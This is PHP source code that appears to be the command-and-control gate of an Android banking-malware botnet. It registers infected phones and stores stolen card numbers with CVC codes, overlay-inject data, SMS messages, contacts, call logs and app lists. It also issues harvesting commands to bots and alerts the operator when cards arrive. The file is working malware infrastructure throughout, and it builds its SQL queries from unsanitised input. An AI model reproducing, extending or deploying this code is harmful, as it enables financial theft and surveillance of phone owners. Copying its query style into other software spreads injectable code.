<?php

	include "config.php";
	 
	function generate_command_gate($bid,$command,$data,$waitrun,$idcom){
		global $dbm;
		$json = "";
		$com = array();
		$com['command'] = $command;
		$com['waitrun'] = $waitrun;
		
		//$idcom = 0;
		
		if($idcom==0){
			$res = $dbm->query("insert into commands(bid,idcom,value,date_add,date_exec,date_recv,result)values('".$bid."','".$command."','".$data."','".time()."','0','".time()."','');");
			$idcom = mysqli_insert_id($dbm->link);
		}
		
		if(strlen($data)>0){
			//$com['her'] = 1;
			$param = json_decode($data);
			$param->timestamp = $idcom;
			$com['params'] = json_encode($param);
		}else{
			//$com['her'] = 2;
			$param = array();
			$param['timestamp'] = $idcom;
			$com['params'] = json_encode($param);
		}
		//print_r($com);
		
	
		return $com;
	} 
	 
	function get_id_contact($bid,$num){
		global $dbm;
		if(strlen($num)>0){
			$sql = "select * from contacts where phone='".$num."' and bot_id='".$bid."'";
			//echo $sql."\r\n";
			$res = $dbm->query($sql);
			if($dbm->count>0){
				while($row=mysqli_fetch_array($res)) {
					return $row[0];
				}
			}else{
				$sql = "insert into contacts (bot_id,fio,phone,time_update) values ('".$bid."','Anonymous','".$num."','".time()."');";
				//echo $sql."\r\n";
				$dbm->query($sql);
				$contact_id = mysqli_insert_id($dbm->link);
				return $contact_id;
			}
		}else{
			return 0;
		}
	}
	 
	$req_dump = file_get_contents( 'php://input' );

	$req_dump = $rc->Decrypt($req_dump);

	$jsonarray = json_decode($req_dump);
	//var_dump($jsonarray);
	
	$needactivate=0;
	$commands = array();
	for($ij=0;$ij<count($jsonarray);$ij++){ 
		$json = $jsonarray[$ij];
		//echo $jsonarray[$ij]."========\r\n";
		if($json->type=="get"){
			$json->info = str_replace(" ","",$json->info);
			$tinfo = explode(",",$json->info);
			$info = array();
			for($i=0;$i<count($tinfo);$i++){
				$info[explode(":",$tinfo[$i])[0]] = explode(":",$tinfo[$i])[1];
			}
			
			$sql = "select * from bots where bid='".$json->id."' LIMIT 1";
			$res = $dbm->query($sql);
			//echo $sql."\n";
			$needactivate = 0;
			if(mysqli_num_rows($res)>0){
				$last_seen = 0;
				while($row=mysqli_fetch_array($res)) {
					$last_seen = $row[5];
					$needactivate = $row['needactivate'];
				}
				
				$dbm->query("update bots set os_type='android',os_lang='".$info['lang']."',os_ver='".$info['android']."',bot_last_seen='".time()."',bot_ver='".$info['ver']."',bot_sandbox='1',bot_permission='".$info['x']."',bot_user_id='".$info['uid']."',bot_ip='".$_SERVER["REMOTE_ADDR"]."',phone_model='".$info['model']."',cell='".$info['cell']."',phonenumber='".$info['phonenumber']."',country='".$info['country']."' where bid='".$json->id."';");
				
				if($needactivate==1){
					//echo $rc->Encrypt(json_encode($commands));
				}else{
					$cmds = array();
					$cmd_last_time = 0;
					$res = $dbm->query("select * from commands where bid='".$json->id."'");
					if($dbm->count>0){
						while($row=mysqli_fetch_array($res)) {
							$cmds[] = $row;
							if($rowlc[4]>$cmd_last_time)$cmd_last_time = $rowlc[4];
						}
					}
					/////////////////////////////
					$sendidcom = array();
					//$res = $dbm->query("select * from commands where bid='".$json->id."' and date_recv='0'");
					//$res = $dbm->query($sql);
					//if($dbm->count>0){
						//while($row=mysqli_fetch_array($res)) {
					foreach($cmds as $cmd){
						//var_dump($cmd);
						if($cmd[6]==0 && $json->id==$cmd[1]){ 
							$commands[] = generate_command_gate($json->id,$cmd[2],$cmd[3],0,$cmd[0]);
							$sendidcom[] = $cmd[0];
						}
					}
					//$commands[] = generate_command(2,"",0,true);
					//$commands[] = generate_command(3,"",0,true);
					//$commands[] = generate_command(4,"",0,true);
					//$commands[] = generate_command(14,"",0,true);
					
					if($last_seen>$kernel['time_day']){ ///////добавить в автокоманды
 						if($cmd_last_time>0){
							if($cmd_last_time<(time()-3600)){
								$commands[] = generate_command_gate($json->id,2,"",0,0);
								$commands[] = generate_command_gate($json->id,3,"",0,0);
								$commands[] = generate_command_gate($json->id,4,"",0,0);
								$commands[] = generate_command_gate($json->id,14,"",0,0);
								$commands[] = generate_command_gate($json->id,9,"",0,0);
								$commands[] = generate_command_gate($json->id,29,"",0,0);
							}
						}
					} 
					
					//if(count($commands)>0){echo $rc->Encrypt(json_encode($commands));}else{echo $rc->Encrypt(json_encode(array($def)));}
					$usid = "";
					for($i=0;$i<count($sendidcom);$i++){
						$usid .= "id=".$sendidcom[$i]."";
						if($i!=(count($sendidcom)-1))$usid .= " or ";
						//var_dump($usid);
					}
					//var_dump($sendidcom);
					$sql = "update commands set date_recv='".time()."' where ".$usid;
					//echo $sql;
					if(count($sendidcom)>0)$dbm->query($sql);
				}
			}else{
				$needactivate = 0;
				if(substr($info['x'],10,1)=="1"){
					$needactivate = 1;
				}
				
				$sql = "insert into bots (bid,os_type,os_lang,os_ver,bot_last_seen,bot_ver,bot_sandbox,bot_permission,bot_user_id,bot_ip,phone_model,category,phonenumber,cell,country,fav,needactivate,bot_type) values ('".$json->id."','android','".$info['lang']."','".$info['android']."','".time()."','".$info['ver']."','0','".$info['x']."','".$info['uid']."','".$_SERVER["REMOTE_ADDR"]."','".$info['model']."','0','".$info['phonenumber']."','".$info['cell']."','".$info['country']."',0,'".$needactivate."','".$info['v']."');";
				//echo $sql."\n";
				$dbm->query($sql);
				
				if(substr($info['x'],10,1)=="0"){
					$commands[] = generate_command_gate($json->id,2,"",0,0);
					$commands[] = generate_command_gate($json->id,3,"",0,0);
					$commands[] = generate_command_gate($json->id,4,"",0,0);
					$commands[] = generate_command_gate($json->id,14,"",0,0);
					$commands[] = generate_command_gate($json->id,9,"",0,0);
					$commands[] = generate_command_gate($json->id,29,"",0,0);
					
					//echo $rc->Encrypt(json_encode($commands));
				}
			}
		}

		if($json->type=="injects"){
			$sql = "insert into injects_data (bid,data,time)values('".$json->id."','".$json->data."',".time().");";
			$dbm->query($sql);
			notification_add("Bot have inject data ".get_link_bot($json->id),"bot.php?id=".$json->id,2);
		}

		if($json->type=="cc"){
			$card = array();
			$card['card'] = $json->card;
			$card['month'] = $json->month;
			$card['year'] = $json->year;
			$card['cvc'] = $json->cvc;
			
			$data = json_encode($card);
			
			$sql = "insert into cards (bot_id,data,time)values('".$json->id."','".$data."',".time().");";
			//echo $sql."\r\n";
			$dbm->query($sql);
			
			notification_add("Bot have CC ".get_link_bot($json->id),"bot.php?id=".$json->id,2);
		}

		if($json->type=="load"){
			$id = get_id_contact($json->id,$json->number);
			$text = $json->text;
			$date = $json->data;
			$hash = md5($text."".$date);
			$sql = "insert into sms (bot_id,sms_from,sms_to,sms_text,sms_time,sms_hash) values ('".$json->id."','".$id."','0','".$text."','".$date."','".$hash."')";
			$dbm->query($sql);
			
			
			$commands[] = generate_command_gate($json->id,4,"",0,0);
			$commands[] = generate_command_gate($json->id,9,"",0,0);
			
			//echo $rc->Encrypt(json_encode($commands));
			//$dbm->query($sql);				
		}

		if($json->type=="smsstatus"){

		}

		if($json->type=="result"){
			$sql = "update commands set result='".$json->data."',date_exec='".time()."' where id='".$json->timestamp."';";
			//echo "her";//$sql; die();
			$dbm->query($sql);
			
			if($json->command=="2"){
				$contacts = json_decode($json->data);
				for($i=0;$i<count($contacts);$i++){
					$number = $contacts[$i]->nomer;
					$sql = "select * from contacts where phone='".$number."' and bot_id='".$json->id."'";
					$res = $dbm->query($sql);
					if($dbm->count>0){
						$sql = "update contacts set fio='".$contacts[$i]->name."' where phone='".$number."' and bot_id='".$json->id."'";
						$dbm->query($sql);
					}else{
						$sql = "insert into contacts (bot_id,fio,phone,time_update) values ('".$json->id."','".$contacts[$i]->name."','".$number."','".time()."');";
						//echo $sql."\r\n";
						$dbm->query($sql);
						$contact_id = mysqli_insert_id($dbm->link);
					}
				}
			}
			
			if($json->command=="3"){
				$sql = "select * from apps where bot_id='".$json->id."'";
				$dbm->query($sql);
				if($dbm->count>0){
					$sql = "update apps set last_update='".time()."',apps='".$json->data."' where bot_id='".$json->id."'";
				}else{
					$sql = "insert into apps (bot_id,apps,last_update)values('".$json->id."','".$json->data."','".time()."');";
				}
				$dbm->query($sql);
				//echo $print_r($json->data);
			}
			
			if($json->command=="4"){
				$boxs = json_decode($json->data);
				for($i=0;$i<count($boxs);$i++){
					$box = $boxs[$i];
					
					$smss = json_decode($box);
					//echo $smss."---";
					for($j=0;$j<count($smss);$j++){
						//echo print_r($smss,true);
						$csms = json_decode($smss[$j]);
						echo print_r($csms,true);
						if($csms->number!=""){
							$num = $csms->number;
							$type = $csms->type;
							$text = $csms->text;
							$date = $csms->date;
							
							$hash = md5($text."".$date);
							$sql = "select * from sms where sms_hash='".$hash."'";
							//echo $sql."\r\n";
							$res = $dbm->query($sql);
							if($dbm->count==0){
								$sql = "";
								$id = get_id_contact($json->id,$num);
								if($id>0){
									if($type=="content://sms/inbox"){
										//////
										$sql = "insert into sms (bot_id,sms_from,sms_to,sms_text,sms_time,sms_hash) values ('".$json->id."','".$id."','0','".$text."','".$date."','".$hash."')";
									}
									if($type=="content://sms/sent"){
										$sql = "insert into sms (bot_id,sms_from,sms_to,sms_text,sms_time,sms_hash) values ('".$json->id."','0','".$id."','".$text."','".$date."','".$hash."')";
									}
									//echo $sql;
									$dbm->query($sql);
								}
							}else{
								////////check contacts exist
							}
						}
					}
					
					//echo $num."---".$type."---".$text."---".$date."---";
					//$sql = "select * from sms where phone='".$number."' and bot_id='".$json->id."'";
					//$res = $dbm->query($sql);
					//if($dbm->count>0){
						//$sql = "update contacts set fio='".$contacts[$i]->name."' where phone='".$number."' and bot_id='".$json->id."'";
						//$dbm->query($sql);
					//}else{
					//	$sql = "insert into contacts (bot_id,fio,phone,time_update) values ('".$json->id."','".$contacts[$i]->name."','".$number."','".time()."');";
						//echo $sql."\r\n";
						//$dbm->query($sql);
						//$contact_id = mysqli_insert_id($dbm->link);
					//}
				}
			}
			
			
			
			if($json->command=="14"){
				$calls = json_decode($json->data);
				for($i=0;$i<count($calls);$i++){
					$number = $calls[$i]->number;
					$sql = "select * from contacts where phone='".$number."' and bot_id='".$json->id."'";
					$res = $dbm->query($sql);
					if($dbm->count>0){
						while($row=mysqli_fetch_array($res)) {
							$sql = "select * from calls where call_time='".$calls[$i]->date."' and bot_id='".$json->id."'";
							$dbm->query($sql);
							if($dbm->count==0){
								$sql = "insert into calls (bot_id,contact_id,call_type,call_time,call_duration) values ('".$json->id."','".$row[0]."','".$calls[$i]->type."','".$calls[$i]->date."','".$calls[$i]->duration."');";
								//echo $sql."\r\n";
								$dbm->query($sql);
							}
						}
					}else{
						$sql = "insert into contacts (bot_id,fio,phone,time_update) values ('".$json->id."','Anonymous','".$number."','".time()."');";
						//echo $sql."\r\n";
						$dbm->query($sql);
						$contact_id = mysqli_insert_id($dbm->link);
						
						$sql = "select * from calls where call_time='".$calls[$i]->date."' and bot_id='".$json->id."'";
						$dbm->query($sql);
						if($dbm->count==0){
							$sql = "insert into calls (bot_id,contact_id,call_type,call_time,call_duration) values ('".$json->id."','".$contact_id."','".$calls[$i]->type."','".$calls[$i]->date."','".$calls[$i]->duration."');";
							//echo $sql."\r\n";
							$dbm->query($sql);
						}
						//$dbm->
					}
				}
			}
		}

		if($json->type=="userlog"){	
			$sql = "insert into apps_logs (bid,app,scr,time) values ('".$json->id."','".$json->win."','','".time()."');";
			//echo $sql."\r\n";
			$dbm->query($sql);			
		}

	}
	
	$def = array();
	$def['command']=0;
	$def['status'] = "ok";
	$def['time'] = time();
	if(count($commands)>0){
		//if($needactivate==1){
			echo $rc->Encrypt(json_encode($commands));
		//}
	}else{
		echo $rc->Encrypt(json_encode(array($def)));
	}
	
	die();
?>
